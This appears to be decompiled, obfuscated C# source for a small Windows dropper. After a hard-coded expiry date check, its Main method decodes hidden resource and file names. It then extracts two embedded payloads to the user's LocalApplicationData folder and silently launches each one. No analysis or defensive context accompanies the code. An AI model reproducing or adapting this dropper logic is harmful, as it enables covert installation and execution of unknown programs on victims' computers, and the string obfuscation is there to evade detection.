using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;

namespace ns0;

internal static class Class0
{
	internal sealed class Class1
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 41325)]
		private struct Struct0
		{
		}

		internal static byte byte_0/* Not supported: data(00) */;

		private static bool bool_0;
	}

	private static void Main()
	{
		if (DateTime.Now > new DateTime(635075501244850025L))
		{
			throw new Exception();
		}
		try
		{
			ResourceManager resourceManager = new ResourceManager(Class2.smethod_0("\uef99\uef96\uef93\uef9a\uef8c", 61405), Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class2.smethod_0("\uee97\ueebc\uee8a\uee88\ueebb\uee96\ueeab\uee9b\uee8a\ueeb7\ueed1\uee9a\uee87\uee9a", 61151), (byte[])resourceManager.GetObject(Class2.smethod_0("\uf08c\uf08d\uf08a\uf0b4\uf0bc\uf09c\uf0ac\uf090\uf0a4\uf0b7", 61637)));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class2.smethod_0("\uee97\ueebc\uee8a\uee88\ueebb\uee96\ueeab\uee9b\uee8a\ueeb7\ueed1\uee9a\uee87\uee9a", 61151));
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class2.smethod_0("\ue4a0\ue48c\ue4a6\ue4b1\ue493\ue483\ue4bd\ue493\ue48f\ue4ae\ue4d8\ue4d8\ue486\ue498\ue491", 58450), (byte[])resourceManager.GetObject(Class2.smethod_0("\uee87\ueea0\uee97\ueeb5\uee86\ueea8\ueea0\uee95\uee8b\ueeb9", 61149)));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class2.smethod_0("\ue4a0\ue48c\ue4a6\ue4b1\ue493\ue483\ue4bd\ue493\ue48f\ue4ae\ue4d8\ue4d8\ue486\ue498\ue491", 58450));
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
